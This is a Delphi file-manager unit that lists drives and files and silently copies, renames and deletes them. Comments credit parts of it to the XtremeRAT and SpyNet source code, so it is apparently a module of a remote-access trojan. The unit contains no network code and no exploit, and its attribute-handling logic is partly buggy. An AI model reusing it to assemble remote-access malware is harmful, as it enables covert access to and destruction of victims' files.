unit UnitFilesManager;

interface

uses
  Windows, SysUtils, ShellAPI, UnitUtils;

function ListDrives: string;
function ListFiles(Path: string; DirsOnly: Boolean): string;
function MyRenameFile_Dir(oldPath, NewPath : string): Boolean;
function MyDeleteFile(s: string): Boolean;
function DeleteAllFilesAndDir(FilesOrDir: string): Boolean;
function CopyDirectory(const Hwd: LongWord; const SourcePath, DestPath : string): boolean;

implementation

//From XtremeRAT 3.6 source code
//-----
function CopyDirectory(const Hwd: LongWord; const SourcePath, DestPath : string): boolean;
var
  OpStruc: TSHFileOpStruct;
  frombuf, tobuf: Array [0..128] of Char;
begin
  Result := false;
  FillChar( frombuf, Sizeof(frombuf), 0 );
  FillChar( tobuf, Sizeof(tobuf), 0 );
  StrPCopy( frombuf,  SourcePath);
  StrPCopy( tobuf,  DestPath);

  with OpStruc dO
  begin
    Wnd := Hwd;
    wFunc := FO_COPY;
    pFrom := @frombuf;
    pTo :=@tobuf;
    fFlags := FOF_NOCONFIRMATION or FOF_RENAMEONCOLLISION;
    fAnyOperationsAborted:= False;
    hNameMappings:= Nil;
    lpszProgressTitle:= Nil;
  end;

  if ShFileOperation(OpStruc) = 0 then Result := true;
end;

function DeleteAllFilesAndDir(FilesOrDir: string): Boolean;
var
  F: TSHFileOpStruct;
  From: string;
  Resultval: integer;
begin
  FillChar(F, SizeOf(F), #0);
  From := FilesOrDir + #0;
  try
    F.wnd := 0;
    F.wFunc := FO_DELETE;
    F.pFrom := PChar(From);
    F.pTo := nil;
    F.fFlags := F.fFlags or FOF_NOCONFIRMATION  or FOF_SIMPLEPROGRESS or FOF_FILESONLY or FOF_NOERRORUI;
    F.fAnyOperationsAborted := False;
    F.hNameMappings := nil;
    Resultval := ShFileOperation(F);
    Result := (ResultVal = 0);
  finally
  end;
end;
//-----

//From SpyNet 2.7 source code
function MyDeleteFile(s: string): Boolean;
var
  i: Byte;
begin
  Result := False;
  if FileExists(s) then
  try
    i := GetFileAttributes(PChar(s));
    i := i and faHidden;
    i := i and faReadOnly;
    i := i and faSysFile;
    SetFileAttributes(PChar(s), i); //change files attributes so hidden files can be deleted
    Result := DeleteFile(Pchar(s));
  except
  end;
end;

function MyRenameFile_Dir(oldPath, NewPath : string): Boolean;
begin
  if oldPath = NewPath then Result := False else
    Result := MoveFile(pchar(OldPath), pchar(NewPath));
end;

function ListDrives: string;
var
  pDrive, Drive: PChar;
begin
  Result := '';
  GetMem(Drive, 512);
  GetLogicalDriveStrings(512, Drive);
  pDrive := Drive;
  
  while pDrive^ <> #0 do
  begin
    Result := Result + pDrive + '|';

    case GetDriveType(pDrive) of
      DRIVE_REMOVABLE:Result := Result + '2|';
      DRIVE_FIXED:Result := Result + '1|';
      DRIVE_REMOTE:Result := Result + '3|';
      DRIVE_CDROM:Result := Result + '4|';
    else
      Result := Result + '1|';
    end;

    Result := Result + #13#10;
    Inc(pDrive, 4);
  end;
end;
             
function GetFileType(FileName: String): String;
var
  FileInfo: TSHFileInfo;
begin
  FillChar(FileInfo, SizeOf(FileInfo), #0);
  SHGetFileInfo(PChar(FileName), 0, FileInfo, SizeOf(FileInfo),SHGFI_TYPENAME);
  Result := FileInfo.szTypeName;
end;

function ListFiles(Path: string; DirsOnly: Boolean): string;
var
  SR: TSearchRec;
  Attrib: string;
begin
  Result := '';
  if Path = '' then Exit;
  if (Path[Length(Path)] <> '\') then Path := Path + '\';
  if FindFirst(Path + '*.*', faAnyFile, SR) = 0 then
  begin
    repeat
      Attrib := '';
      if (SR.Attr and faDirectory) = faDirectory then Attrib := Attrib + 'D';   
      if (SR.Attr and faArchive) = faArchive then Attrib := Attrib + 'A';
      if (SR.Attr and faHidden) = faHidden then Attrib := Attrib + 'H';
      if (SR.Attr and faSysFile) = faSysFile then Attrib := Attrib + 'S';
      if (SR.Attr and faHidden) = faReadOnly then Attrib := Attrib + 'R';

      if DirsOnly then
      begin
        if (SR.Attr and faDirectory) = faDirectory then
        if SR.Name <> '.' then Result := Result + SR.Name + '|Folder|' + Attrib + '|' +
          '-|' + IntToStr(SR.Time) + '|' + #13#10;
      end
      else

      begin
        if (SR.Attr and faDirectory) <> faDirectory then
        Result := Result + SR.Name + '|' + GetFileType(Path + SR.Name) + '|' + Attrib + '|' +
          FileSizeToStr(SR.Size) + '|' + IntToStr(SR.Time) + '|' + #13#10;
      end;
    until FindNext(SR) <> 0;
    FindClose(SR);
  end;
end;

end.
